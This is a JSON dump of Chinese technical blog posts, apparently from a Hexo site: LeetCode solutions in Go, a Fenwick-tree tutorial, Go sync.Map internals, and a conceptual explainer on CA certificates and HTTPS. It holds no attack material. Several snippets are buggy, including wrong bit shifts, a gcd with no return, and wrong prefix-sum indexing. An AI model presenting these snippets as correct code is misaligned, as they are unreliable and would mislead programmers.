}","categories":[{"name":"面经","slug":"面经","permalink":"https://github.com/z-anshun/categories/%E9%9D%A2%E7%BB%8F/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://github.com/z-anshun/tags/Redis/"}]},{"title":"最长的美好子字符串","slug":"最长的美好子字符串","date":"2022-02-01T12:00:01.000Z","updated":"2022-02-01T12:45:00.954Z","comments":true,"path":"2022/02/01/zui-chang-de-mei-hao-zi-zi-fu-chuan/","link":"","permalink":"https://github.com/z-anshun/2022/02/01/zui-chang-de-mei-hao-zi-zi-fu-chuan/","excerpt":"","text":"最长美好子字符串 1763. 最长的美好子字符串当一个字符串 s 包含的每一种字母的大写和小写形式 同时 出现在 s 中，就称这个字符串 s 是 美好 字符串。比方说，\"abABB\" 是美好字符串，因为 'A' 和 'a' 同时出现了，且 'B' 和 'b' 也同时出现了。然而，\"abA\" 不是美好字符串因为 'b' 出现了，而 'B' 没有出现。 给你一个字符串 s ，请你返回 s 最长的 美好子字符串 。如果有多个答案，请你返回 最早 出现的一个。如果不存在美好子字符串，请你返回一个空字符串。 示例 1： 输入：s = \"YazaAay\" 输出：\"aAa\" 解释：\"aAa\" 是一个美好字符串，因为这个子串中仅含一种字母，其小写形式 'a' 和大写形式 'A' 也同时出现了。 \"aAa\" 是最长的美好子字符串。 法1：枚举首先，对于一个字符串存在的英文字母，我们需要对其做标记，这里我们使用二进制方法最为简便 mask:=uint(0) // 假设这里的str全为小写字母 for _,ch:=range str{ mask|=1&gt;&gt;(ch-'a') } 然后，我们对s的子字符串枚举，即s[i:j]，令其大写字母的标记upper，小写字母的标记lower，当两个标记相等时，即为完美子字符串，进而获取最长的即可 代码实现： func longestNiceSubstring(s string) string { n:=len(s) res:=\"\" for i:=0;i&lt;n-1;i++{ lower,upper:=0,0 for j:=i;j&lt;n;j++{ if s[j]&gt;='a'&amp;&amp;s[j]&lt;='z'{ lower|=1&lt;&lt;(s[j]-'a') }else{ upper|=1&lt;&lt;(s[j]-'A') } if lower==upper&amp;&amp;len(res)&lt;j-i+1{ res=s[i:j+1] } } } return res } 时间复杂度：O*(*n^2) 空间复杂度：O(1) 法2：分治既然为字符串，那么一定在其某个分段里 如何分段？ 我们首先对整个字符串获取到upper和lower的标记，然后取并,就知道需要哪些大小字母，也就知道哪些字母一定不会在最终结果， 进而就可以对其进行分段 代码实现： func longestNiceSubstring(s string) (ans string) { if s == \"\" { return } lower, upper := 0, 0 for _, ch := range s { if unicode.IsLower(ch) { lower |= 1 &lt;&lt; (ch - 'a') } else { upper |= 1 &lt;&lt; (ch - 'A') } } // 如果当前即为完美字符串 if lower == upper { return s } // 获取可能需要的字母标记 v := lower &amp; upper for i := 0; i &lt; len(s); i++ { start := i idx := unicode.ToLower(rune(s[i])) - 'a' // 获取到对应的标记 // 右边最大的下标 for i &lt; len(s) &amp;&amp; v&amp;(1&gt;&gt;idx) == 1 { i++ } t := longestNiceSubstring(s[start:i]) if len(ans) &lt; len(t) { ans = t } } return } 时间复杂度：O(n⋅∣Σ∣)，其中 n 为字符串的长度，∣Σ∣ 为字符集的大小，这里因为英文字母为52个（包含大小写），即使|Σ|=52，其递归深度，最大为|Σ|/2=26，因为每次递归会去掉一个肯定不会出现在结果里的字母 空间复杂度：O(|Σ|)，递归深度为|Σ|/2 法3：滑动窗口首先，我们能够获取到该字符串的总的字母类型（不分大小写），令其为maxNum（maxNum&gt;0&amp;&amp;maxNum&lt;=26） 那么，我们就能枚举，当前的字母类型，从1~maxNum， 最后，我们进行窗口滑动，设置几个变量 upper,lower：[26]int数组，分别为大小写字母的个数 total：即当前窗口总的种类，当有一个新字母进来时+1 cnt 当前窗口满足的条件的种类，当一个字母满足既有大写和小写时+1 l：左边界，当total大于当前枚举的类型时，就需要移动左边界进行缩减，当前缩减时，需要将对应的值进行改变 r：右边界 进而在枚举过程中，就能获取到最长的完美子字符串 代码实现： func longestNiceSubstring(s string) (ans string) { mask := uint(0) for _, ch := range s { mask |= 1 &lt;&lt; (unicode.ToLower(ch) - 'a') } maxNum := bits.OnesCount(mask) for i := 1; i &lt;= maxNum; i++ { var lowerC, upperC [26]int total, cnt, l := 0, 0, 0 for r, ch := range s { idx := unicode.ToLower(ch) - 'a' if ch &gt;= 'a' &amp;&amp; ch &lt;= 'z' { lowerC[idx]++ if lowerC[idx] == 1 &amp;&amp; upperC[idx] &gt; 0 { cnt++ } } else { upperC[idx]++ if upperC[idx] == 1 &amp;&amp; lowerC[idx] &gt; 0 { cnt++ } } // 只含有一个 if lowerC[idx]+upperC[idx] == 1 { total++ } // 当总的个数大于当前类型个数了 for total &gt; i { idx := unicode.ToLower(rune(s[l])) - 'a' if lowerC[idx]+upperC[idx] == 1 { total-- } if s[l] &gt;= 'a' &amp;&amp; s[l] &lt;= 'z' { lowerC[idx]-- if lowerC[idx] == 0 &amp;&amp; upperC[idx] &gt; 0 { cnt-- } } else { upperC[idx]-- if upperC[idx] == 0 &amp;&amp; lowerC[idx] &gt; 0 { cnt++ } } l++ } if cnt == i &amp;&amp; r-l+1 &gt; len(ans) { ans = s[l : r+1] } } } return } 时间复杂度：O(n⋅∣Σ∣)，其中 n 为字符串的长度，∣Σ∣ 为字符集的大小 空间复杂度：O(∣Σ∣)。需要 O(∣Σ∣) 存储所有大小写字母的计数 衍生题： 395. 至少有 K 个重复字符的最长子串给你一个字符串 s 和一个整数 k ，请你找出 s 中的最长子串， 要求该子串中的每一字符出现次数都不少于 k 。返回这一子串的长度。 示例 1： 输入：s = \"aaabb\", k = 3 输出：3 解释：最长子串为 \"aaa\" ，其中 'a' 重复了 3 次。 法1：分治跟上题一样的做法，在拆分时，我们对个数小于k的字母进行拆分即可 代码实现 func longestSubstring(s string, k int) int { var r [26]int for _, v := range s { r[v-'a']++ } var split byte for i, v := range r[:] { if v &gt; 0 &amp;&amp; v &lt; k { split = byte(i) + 'a' break } } if split == 0 { return len(s) } strs := strings.Split(s, string(split)) res := 0 for _, str := range strs { res = max(res, longestSubstring(str, k)) } return res } func max(x, y int) int { if x &gt; y { return x } return y } 法2：滑动窗口跟上题类似，直接亮代码 func longestSubstring(s string, k int) (ans int) { for i := 1; i &lt; 26; i++ { cnt := [26]int{} l := 0 // 左 total := 0 // 总的种类 lessK := 0 // 少于K个的种类 for r, ch := range s { idx := ch - 'a' if cnt[idx] == 0 { lessK++ total++ } cnt[idx]++ if cnt[idx] == k { lessK-- } for total &gt; i { idx := s[l] - 'a' if cnt[idx] == k { lessK++ } cnt[idx]-- if cnt[idx] == 0 { total-- lessK-- } } if lessK == 0 &amp;&amp; ans &lt; r-l+1 { ans = r - l + 1 } } } return }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"跳跃游戏","slug":"跳跃游戏","date":"2022-01-22T14:53:29.000Z","updated":"2022-01-22T15:01:11.188Z","comments":true,"path":"2022/01/22/tiao-yue-you-xi/","link":"","permalink":"https://github.com/z-anshun/2022/01/22/tiao-yue-you-xi/","excerpt":"","text":"题目： 1345. 跳跃游戏 IV给你一个整数数组 arr ，你一开始在数组的第一个元素处（下标为 0）。 每一步，你可以从下标 i 跳到下标： i + 1 满足：i + 1 &lt; arr.length i - 1 满足：i - 1 &gt;= 0 j 满足：arr[i] == arr[j] 且 i != j 请你返回到达数组最后一个元素的下标处所需的 最少操作次数 。 注意：任何时候你都不能跳到数组外面。 示例 1： 输入：arr = [100,-23,-23,404,100,23,23,23,3,404] 输出：3 解释：那你需要跳跃 3 次，下标依次为 0 --&gt; 4 --&gt; 3 --&gt; 9 。下标 9 为数组的最后一个元素的下标。 分析： 因为一个点，可以到i-1、i+1和值相同的点（i为0就没i-1，i为n-1就没i+1,这里的i为arr的下标），那么，很明显，可以构造一个图，使用邻接表进行记录。 然后，我们再从0下标开始进行节点的遍历，因为要求的最少，所以需要一个map对经过的节点记录（约早可抵达的，肯定步数越少） 代码实现： type pair struct { idx,step int } func minJumps(arr []int)int{ n:=len(arr) idx:=map[int][]int{} for i, v := range arr { idx[v] = append(idx[v], i) } vis:=map[int]bool{0:true} // 下标 -&gt; 是否走过 q:=[]pair{{}} for { // pop p:=q[0] q=q[1:] i,step:=p.idx,p.step if i==n-1{ return step } for _,j:=range idx[arr[i]]{ if !vis[j]{ vis[j]=true q = append(q, pair{j,step+1}) } } delete(idx,arr[i]) // 往后 if !vis[i+1]{ vis[i+1]=true q = append(q, pair{i+1,step+1}) } if i&gt;0&amp;&amp;!vis[i-1]{ vis[i-1]=true q = append(q, pair{i-1,step+1}) } } }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"BFS","slug":"BFS","permalink":"https://github.com/z-anshun/tags/BFS/"}]},{"title":"最长重复子数组","slug":"最长重复子数组","date":"2022-01-22T14:29:51.000Z","updated":"2022-01-22T14:52:06.050Z","comments":true,"path":"2022/01/22/zui-chang-chong-fu-zi-shu-zu/","link":"","permalink":"https://github.com/z-anshun/2022/01/22/zui-chang-chong-fu-zi-shu-zu/","excerpt":"","text":"题目：718. 最长重复子数组 给两个整数数组 A 和 B ，返回两个数组中公共的、长度最长的子数组的长度。 示例： 输入： A: [1,2,3,2,1] B: [3,2,1,4,7] 输出：3 解释： 长度最长的公共子数组是 [3, 2, 1] 。 提示： 1 &lt;= len(A), len(B) &lt;= 1000 0 &lt;= A[i], B[i] &lt; 100 分析： 首先，对于数组A和B，我们创建下面一个表 0 1 2 3 4 0 0 0 1 0 0 1 0 1 0 1 0 2 1 0 0 0 1 3 0 0 0 0 0 4 0 0 0 0 0 其中，横竖轴分表为两个数组的下标，相同为1，不相同为0 那么，仔细观察，我们就能得出递推公式$$若A[i]==B[j]\\dp[i][j]=dp[i-1][j-1]+1\\反之\\dp[i][j]=0$$代码实现： func findLength(nums1 []int, nums2 []int) int { n,m:=len(nums1),len(nums2) dp:=make([][]int,n) for i:=range dp{ dp[i]=make([]int,m) } res:=0 for i:=0;i&lt;n;i++{ for j:=0;j&lt;m;j++{ if nums1[i]==nums2[j]{ if i==0||j==0{ dp[i][j]=1 }else{ dp[i][j]=dp[i-1][j-1]+1 } res=max(dp[i][j],res) } } } return res } func max(x,y int)int{ if x&gt;y{ return x } return y } 当然，这个也可以用在找最长公共子字符串","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"动归","slug":"动归","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E5%BD%92/"}]},{"title":"CA证书","slug":"CA证书","date":"2022-01-19T04:53:30.000Z","updated":"2022-02-07T12:44:50.145Z","comments":true,"path":"2022/01/19/ca-zheng-shu/","link":"","permalink":"https://github.com/z-anshun/2022/01/19/ca-zheng-shu/","excerpt":"","text":"认证中心CACertificate Authority，证书认证中心 流程： 服务端S会向第三方CA提交公钥（记住不是私钥，私钥自己留着）、组织信息、个人信息（域名）等信息并申请认证 CA通过线上、线下等多种手段，验证申请者提供信息的真实性，如组织是否存在、企业是否合法，是否拥有域名的所有权等 .如信息审核通过，CA会向申请者签发认证文件-证书 证书包含以下信息：申请者的公钥、申请者的组织信息和个人信息、签发机构CA的信息、有效时间、证书序列号等信息的明文，同时还有一个签名 签名：首先使用散列函数计算公开的明文信息的信息摘要，然后，使用CA的私钥进行加密，其加密后的密文就是签名 客户端C向服务器S发送请求，S返回证书文件 客户端C读取证书中的明文信息，采用相同的散列函数计算得到信息摘要，然后，利用对应CA的公钥解密签名数据，对比证书的信息摘要，如果一致，则可以确认证书的合法性，即公钥合法 客户端然后验证证书相关的域名信息、有效时间等信息; 客户端会**内置信任CA的证书信息(包含公钥)**，如果CA不被信任，则找不到对应 CA的证书，证书也会被判定非法 过程中需要注意的： 这里出现了两个公钥，一个CA的，一个服务器自己的，发送的信息中携带着公钥 证书的合法性仍然依赖于非对称加密算法，证书主要是增加了服务器信息以及签名; 内置 CA 对应的证书称为根证书，颁发者和使用者相同，自己为自己签名，即自签名证书（为什么说”部署自签SSL证书非常不安全”） 证书=公钥（服务方生成密码对中的公钥）+申请者与颁发者信息+签名（用CA机构生成的密码对的私钥进行签名） 也就是即便有人截取服务器A证书，再发给客户端，想冒充服务器A，也无法实现。因为证书和url的域名是绑定的。 CA的作用 颁发证书，颁发证书其实就是使用CA的私钥对证书请求签名文件进行签名 颁发的证书浏览器要信任，浏览器只需要用CA的公钥进行验签成功就表示这个证书是合法可信的，这就需要浏览器内置CA的公钥，也就是内置CA的证书。一般来说，操作系统都会内置权威CA的证书，有的浏览器会使用操作系统内置的CA证书列表，有的浏览器则自己维护的CA证书列表，比如Firefox HTTP通信存在的问题 被监听： 被伪装 呗篡改 两种加密方式 共享密钥加密 共享密钥的加密密钥和解密密钥是相同的，所以又称为对称密钥 公开密钥加密 加密算法是公开的，密钥是保密的。公开密钥分为私有密钥和公有密钥，公有密钥是公开的，任何人(客户端)都可以获取，客户端使用公有密钥加密数据，服务端用私有密钥解密数据。 异同 共享密钥加密与公开密钥加密相比，加解密处理速度快，但公开密钥更适应互联网下使用 httpshttps很好的解决了http的三个缺点（被监听、被篡改、被伪装），https不是一种新的协议，它是http+SSL(TLS)的结合体，SSL是一种独立协议，所以其它协议比如smtp等也可以跟ssl结合。https改变了通信方式，它由以前的http—–&gt;tcp，改为http——&gt;SSL—–&gt;tcp；https采用了共享密钥加密+公开密钥加密的方式 防监听 数据是加密的，所以监听得到的数据是密文，hacker看不懂。 防伪装 伪装分为客户端伪装和服务器伪装，通信双方携带证书，证书相当于身份证，有证书就认为合法，没有证书就认为非法，证书由第三方颁布，很难伪造 防篡改 https对数据做了摘要，篡改数据会被感知到。hacker即使从中改了数据也白搭。 如何建立https连接？ 客户端发送请求到服务器端 服务器端返回证书和公钥，公钥作为证书的一部分而存在 客户端验证证书和公钥的有效性，如果有效，则生成共享密钥并使用公钥加密发送到服务器端 服务器端使用私钥解密数据，并使用收到的共享密钥加密数据，发送到客户端 客户端使用共享密钥解密数据 SSL加密建立………","categories":[{"name":"面经","slug":"面经","permalink":"https://github.com/z-anshun/categories/%E9%9D%A2%E7%BB%8F/"}],"tags":[{"name":"https","slug":"https","permalink":"https://github.com/z-anshun/tags/https/"}]},{"title":"最大公约数","slug":"gcb","date":"2021-12-13T07:48:17.000Z","updated":"2021-12-13T08:10:16.701Z","comments":true,"path":"2021/12/13/gcb/","link":"","permalink":"https://github.com/z-anshun/2021/12/13/gcb/","excerpt":"","text":"最大公约数即为 Greatest Common Divisor，常缩写为 gcd 欧几里得算法$$若x=cn,y=cm，c为最大公约数\\那么当x&gt;y时，即n&gt;m时\\令x=yk+j,那么j=x\\pmod y \\而j=x-yk=c*(n-m*k)\\也就是j和y的最大公约数也为c$$那么 gcd(x,y) = gcd(y,x%y) 代码实现 func gcd(x,y int)int{ if y==0{ return x } gcd(y,x%y) } 时间复杂度为O(lgn)","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"和至少为 K 的最短子数组","slug":"和至少为 K 的最短子数组","date":"2021-12-12T07:45:32.000Z","updated":"2022-02-02T09:53:18.660Z","comments":true,"path":"2021/12/12/he-zhi-shao-wei-k-de-zui-duan-zi-shu-zu/","link":"","permalink":"https://github.com/z-anshun/2021/12/12/he-zhi-shao-wei-k-de-zui-duan-zi-shu-zu/","excerpt":"","text":"题目：给你一个整数数组 nums 和一个整数 k ，找出 nums 中和至少为 k 的 最短非空子数组 ，并返回该子数组的长度。如果不存在这样的 子数组 ，返回 -1 。 子数组 是数组中 连续 的一部分。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shortest-subarray-with-sum-at-least-k 示例： 输入：nums = [1], k = 1 输出：1 分析： 若，nums[i+1]+...+nums[j] &gt;= k 那么令，A[i]=nums[0]+nums[i]+...+nums[i]，即前缀合，也就是A[j]-A[i] &gt;=k 那么只需将A遍历即可 如： for i:=0;i&lt;n;i++{ for j:=i-1;j&gt;=0;j--{ if A[i]-A[j]&gt;=k&amp;&amp;i-j&lt;res{ res=i-j } } } 但是，时间复杂度为O(n^2) 优化 我们可以发现，A[j]-A[i] = A[j]-A[m]+(A[m]-A[i])，也就是当前若A[j]-A[m]&gt;=k,那么A[j]-A[i]&gt;=k，即，当前可以判断i++的循环下，最小的窗口长度 for i:=0;i&lt;n;i++{ for len(queue)!=0{ l:=queue[0] // 若i~l的合大于k，队头就出队列 // 因为若A[i]-A[l]&gt;=k，那么A[i+1]-A[l]&gt;=k就满足，即不需要再判断以l为左边界 if A[i]-A[l]&gt;=k{ res=min(i-l) queue=queue[1:] }else{ // 反之就退出 break } } queue=append(queue,i) } 但是，出错，因为若m&lt;i,有可能A[m]&gt;A[i]，也就是A[i]-A[m] &lt; 0, 那么A[j]-A[i]&gt;=k的前提下，A[j]-A[i-m]=A[j]-A[i]+(A[i]-A[m])&gt;=k，m大于0便不成立， 即，A[j]-A[m]&lt;k,但是A[j]-A[i]&gt;=k,其中i&gt;m，但在上诉代码中，其m下标可能因为A[j]-A[m]&lt;k而不会被退出，进而无法遍历到A[j]-A[i] 那么，我们可以通过改变queue中的下标，使其拥有的A[i]-A[queue[n]]&gt;=k，那么A[i]-A[quque[n-1]]&gt;=k一定成立，即i与queue中相减的每一段一定为正数 for i:=0;i&lt;n;i++{ // 确保A[i]-A[queue[n]]&gt;=k时，A[i]-A[quque[n-1]]&gt;=k成立， // 即 A[queue[n]]-A[queue[n-1]]&gt;0 for len(queue)!=0&amp;&amp;A[i]-A[queue[len(queue)-1]]&lt;0{ quque=queue[:len(queue)-1] } for len(queue)!=0{ l:=queue[0] if A[i]-A[l]&gt;=k{ res=min(i-l) queue=queue[1:] }else{ break } } queue=append(queue,i) } 整体代码实现 func shortestSubarray(nums []int, k int) int { n := len(nums) if n == 0 { return -1 } res := n + 1 A := make([]int, n+1) // 前缀合 A[0] = nums[0] for i := 1; i &lt;= n; i++ { A[i] = nums[i] + A[i-1] if A[i] &gt;= k { return 1 } } var queue []int for i := 0; i &lt;= n; i++ { for len(queue) != 0 &amp;&amp; A[i] &lt;= A[queue[len(queue)-1]] { queue = queue[:len(queue)-1] } for len(queue) != 0 &amp;&amp; A[i]-queue[0] &gt;= k { if res &gt; i-queue[0] { res = i - queue[0] } queue = queue[1:] } queue = append(queue, i) } if res==n+1{ return -1 } return res }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"动态窗口","slug":"动态窗口","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E6%80%81%E7%AA%97%E5%8F%A3/"}]},{"title":"sync.Map原理","slug":"sync.Map原理","date":"2021-12-06T04:03:53.000Z","updated":"2021-12-06T14:53:09.567Z","comments":true,"path":"2021/12/06/sync.map-yuan-li/","link":"","permalink":"https://github.com/z-anshun/2021/12/06/sync.map-yuan-li/","excerpt":"","text":"数据结构Map type Map struct{ // 加锁保护，用于dirty字段 mu Mutex // 只读数据，实际类型为readOnly，为原子操作 read atomic.Value // 原子操作实现的值 // 最新写入的数据 dirty map[interface{}]*entry // 记录新写入的数据，便于刷新 misses int } readOnly type readOnly struct{ // 内部的map m map[interface{}]*entry // ditry中是否含有read中没有的 amended bool } entry // 标记从dirty中删除的 var expunged = unsafe.Pointer(new(interface{})) // 存储值的指针 type entry struct{ p unsafe.Pointer // 等同于*interface } p == nil：键值被删除，且m.dirty == nil，即木有新写入的数据 p == expunged：键值已被删除，但m.dirty != nil 且 m.dirty 不存在该键值（expunged 实际是空接口指针） 反之，则键值对存在，存在于 m.read.m 中，如果 m.dirty!=nil 则也存在于 m.dirty 方法解析Load func (m *Map) Load(key interface{}) (value interface{}, ok bool) { read,_ := m.read.Load().(readOnly) e,ok := read.m[key] // read中没有，但dirty中有 if !ok&amp;&amp;read.amended{ m.mu.Lock() // 由于上面 read 获取没有加锁，为了安全再检查一次 read,_ := m.read.Load().(readOnly) e,ok := read.m[key] // 确实不存在 if !ok&amp;&amp;read.amended{ e,ok = m.dirty[key] // 调用miss m.missLocked() } m.mu.Unlock() } if !ok{ return nil,false } return e.load() } func (e *enrty)load()(value interface{},ok bool){ // 导出对应的指针的值，类似*ptr p := atomic.LoadPointer(&amp;e.p) if p==nil || p == expunged{ return nil,false } return *(*interface{})(p),true } func (m *Map) missLocked() { m.misses++ if m.misses &lt; len(m.dirty) { return } // 当 miss 积累过多，会将 dirty 存入 read，然后 将 amended = false，且 m.dirty = nil m.read.Store(readOnly{m: m.dirty}) m.dirty = nil m.misses = 0 } Store func (m *Map) Store(key, value interface{}) { read, _ := m.read.Load().(readOnly) // 如果当前值存在，就尝试覆盖 if e, ok := read.m[key]; ok &amp;&amp; e.tryStore(&amp;value) { return } m.mu.Lock() // 加锁后，进行读取 read,_ = m.read.Load().(readOnly) // 情况1：read里存在 if e, ok := read.m[key]; ok { if e.unexpungeLocked() { // 如果当前值已经删除，则先更新dirty m.dirty[key] = e } // 无条件存储 e.storeLocked(&amp;value) }else if e, ok := m.dirty[key]; ok { // 情况2:如果dirty中存在 e.storeLocked(&amp;value) // 只更改dirty即可，后面会更新read }else{ // 情况3:read和dirty中都没有 if !read.amended{ // dirty中跟read已经合并，即已经更新脏表，即现在read数据比dirty多 // 调用 dirtyLocked 将 read 拷贝到 dirty（除了被标记删除的数据） m.dirtyLocked() // 保存新的read m.read.Store(readOnly{m: read.m, amended: true}) } // 如果dirty中还有read里没有的 m.dirty[key] = newEntry(value)// 直接写入 } m.mu.Unlock() } func newEntry(i interface{}) *entry { return &amp;entry{p: unsafe.Pointer(&amp;i)} } // 比较当前指针是否为expunged func (e *entry) unexpungeLocked() (wasExpunged bool) { return atomic.CompareAndSwapPointer(&amp;e.p, expunged, nil) } func (e *entry) storeLocked(i *interface{}) { atomic.StorePointer(&amp;e.p, unsafe.Pointer(i)) } func (e *entry) tryStore(i *interface{}) bool { for { p := atomic.LoadPointer(&amp;e.p) if p == expunged { return false } // 比较并交换到指定位置 if atomic.CompareAndSwapPointer(&amp;e.p, p, unsafe.Pointer(i)) { return true } } } func (m *Map) dirtyLocked() { // 如果脏表还有数据，返回 if m.dirty != nil { return } read, _ := m.read.Load().(readOnly) m.dirty = make(map[interface{}]*entry, len(read.m)) for k, e := range read.m { // 尝试对read中的数据清除失败 if !e.tryExpungeLocked() { m.dirty[k] = e // 放入dirty中 } } } // 尝试对e写入expunged func (e *entry) tryExpungeLocked() (isExpunged bool) { p := atomic.LoadPointer(&amp;e.p) for p == nil { if atomic.CompareAndSwapPointer(&amp;e.p, nil, expunged) { return true } p = atomic.LoadPointer(&amp;e.p) } return p == expunged } Delete func (m *Map)Delete(key interface{}){ m.LoadAndDelete(key) } func (m *Map) LoadAndDelete(key interface{}) (value interface{}, loaded bool) { read, _ := m.read.Load().(readOnly) e, ok := read.m[key] if !ok &amp;&amp; read.amended { m.mu.Lock() read, _ = m.read.Load().(readOnly) e, ok = read.m[key] // 老规矩，如果read中没有，dirty中还有read中没有的 if !ok &amp;&amp; read.amended { e, ok = m.dirty[key] m.missLocked() } m.mu.Unlock() } // 如果有 if ok { return e.delete() } return nil, false } func (e *entry) delete() (value interface{}, ok bool) { for { // 导出指针，便于返回 p := atomic.LoadPointer(&amp;e.p) if p == nil || p == expunged { return nil, false } // f if atomic.CompareAndSwapPointer(&amp;e.p, p, nil) { return *(*interface{})(p), true } } }","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://github.com/z-anshun/tags/Golang/"}]},{"title":"树状数组","slug":"树状数组","date":"2021-10-21T14:24:17.000Z","updated":"2021-10-21T14:24:56.019Z","comments":true,"path":"2021/10/21/shu-zhuang-shu-zu/","link":"","permalink":"https://github.com/z-anshun/2021/10/21/shu-zhuang-shu-zu/","excerpt":"","text":"简介线状数组类是线段树，但是却又不同，其对于节点的更改，和查找集合是十分方便的 原理假设，我们当前的数组为a，构成的线状数组为c 那么 即： c[1]=a[1] c[2]=a[1]+a[2] c[3]=a[3] c[4]=a[1]+a[2]+a[3]+a[4] c[5]=a[5] c[6]=a[5]+a[6] c[7]=a[7] c[8]=a[1]+a[2]+a[3]+a[4]+a[5]+a[6]+a[7] 我们换一个角度观察： c[0001]=a[1] c[0010]=a[1]+a[2] c[0011]=a[3] c[0100]=a[1]+a[2]+a[3]+a[4] c[01001]=a[5] c[0110]=a[5]+a[6] c[0111]=a[7] c[1000]=a[1]+a[2]+a[3]+a[4]+a[5]+a[6]+a[7]+a[8] 也就是:$$c[i]=a[i-2^k+1]+ … + a[i]\\k为i的二进制中末尾连续0的个数$$如：i=8时，k=3,则：c[1000]=a[1]+a[2]+a[3]+a[4]+a[5]+a[6]+a[7]+a[8] 求和很明显 sum[5]=a[1]+a[2]+a[3]+a[4]+a[5] 也就是 sum[5]=c[4]+c[5] 即：sum[101]=c[100]+c[101] 也就是当前的sum为每次去除二进制i后末尾的1，直到为0的合 代码展示 // 取出最低位的1 func lowbit(i int) int { // 比如：6 = 0110 // -6 = 1001+1 = 1010 // 6&amp;(-6) = 0010 = 2 return i &amp; (-i) } // 求和 // sum(7) = a[1]+a[2]+a[3]+a[4]+a[5]+a[6]+a[7] // c[4] = a[1] + a[2] + a[3] + a[4]；c[6] = a[5] + a[6] ; c[7] = a[7] // sum(7) = c[4] + c[6] + c[7] // 即：sum(111) = c[100] + c[110] + c[111] func getSum(x int, c []int) int { sum := 0 // 每次减去末尾的1 for i := x; i &gt; 0; i -= lowbit(i) { sum += c[i] } return sum } 查询跟求和类似，直接上代码 // 下标为x的增加y // 如 x = 1 = 0001 ；c[1],c[2],c[4],c[8]则需要更新 // 即：0001、0010、0100、1000 // 更新即查询的逆过程 func add(x, y int, c []int) { for i := x; i &lt; len(c); i += lowbit(i) { c[i] += y } } 整体代码// c[i] = a[i-2^k+1] + ... + a[i] // k 为i的二进制下末尾连续的0的个数 // 如：c[6] = a[5] + a[6] 6 = 0110 k = 1 // 取出最低位的1 func lowbit(i int) int { // 比如：6 = 0110 // -6 = 1001+1 = 1010 // 6&amp;(-6) = 0010 = 2 return i &amp; (-i) } // 求和 // sum(7) = a[1]+a[2]+a[3]+a[4]+a[5]+a[6]+a[7] // c[4] = a[1] + a[2] + a[3] + a[4]；c[6] = a[5] + a[6] ; c[7] = a[7] // sum(7) = c[4] + c[6] + c[7] // 即：sum(111) = c[100] + c[110] + c[111] func getSum(x int, c []int) int { sum := 0 // 每次减去末尾的1 for i := x; i &gt; 0; i -= lowbit(i) { sum += c[i] } return sum } // 下标为x的增加y // 如 x = 1 = 0001 ；c[1],c[2],c[4],c[8]则需要更新 // 即：0001、0010、0100、1000 // 更新即查询的逆过程 func add(x, y int, c []int) { for i := x; i &lt; len(c); i += lowbit(i) { c[i] += y } } func created(arr []int) []int { n := len(arr) c := make([]int, n) for i := 0; i &lt; n; i++ { // 跟更新类似 c[i] += arr[i] j := i + lowbit(i) // 更新其父节点 if j &lt; n { c[j] += c[i] } } return c } 例题： 在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组，求出这个数组中的逆序对的总数。 示例 1: 输入: [7,5,6,4]输出: 5 限制： 0 &lt;= 数组长度 &lt;= 50000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shu-zu-zhong-de-ni-xu-dui-lcof func reversePairs(nums []int) int { n := len(nums) tmp := make([]int, n) copy(tmp, nums) sort.Ints(tmp) // 排序 for i := 0; i &lt; n; i++ { // nums = {3,4,2} // 如，tmp={2,3,4} // nums = {2,3,1} nums[i] = sort.SearchInts(tmp, nums[i]) + 1 // 找到对应的下标 +1 } bit := BIT{n: n, tree: make([]int, n+1)} ans := 0 // 从后往前遍历. 现在nums为排序后的对应的index for i := n - 1; i &gt;= 0; i-- { ans += bit.query(nums[i] - 1) bit.update(nums[i]) } return ans } type BIT struct { n int tree []int } func (b BIT) lowbit(x int) int { return x &amp; (-x) } func (b BIT) query(x int) int { ret := 0 for x &gt; 0 { ret += b.tree[x] x -= b.lowbit(x) } return ret } // 对应的+1 // 这里可能会很大 func (b BIT) update(x int) { for x &lt;= b.n { b.tree[x]++ x += b.lowbit(x) } }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"树状数组","slug":"树状数组","permalink":"https://github.com/z-anshun/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"}]},{"title":"最多牌组数","slug":"最多牌组数","date":"2021-10-09T10:13:45.000Z","updated":"2021-10-09T10:14:03.638Z","comments":true,"path":"2021/10/09/zui-duo-pai-zu-shu/","link":"","permalink":"https://github.com/z-anshun/2021/10/09/zui-duo-pai-zu-shu/","excerpt":"","text":"题目：麻将的游戏规则中，共有两种方式凑成「一组牌」： 顺子：三张牌面数字连续的麻将，例如 [4,5,6]刻子：三张牌面数字相同的麻将，例如 [10,10,10]给定若干数字作为麻将牌的数值（记作一维数组 tiles），请返回所给 tiles 最多可组成的牌组数。 注意：凑成牌组时，每张牌仅能使用一次。 示例 1： 输入：tiles = [2,2,2,3,4] 输出：1 解释：最多可以组合出 [2,2,2] 或者 [2,3,4] 其中一组牌 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/Up5XYM 分析： 首先，我们如果拿到一组牌，如 1112223344，那么它可以组成111、234、234时为最多的牌组数，若是11122233最多即为111、222 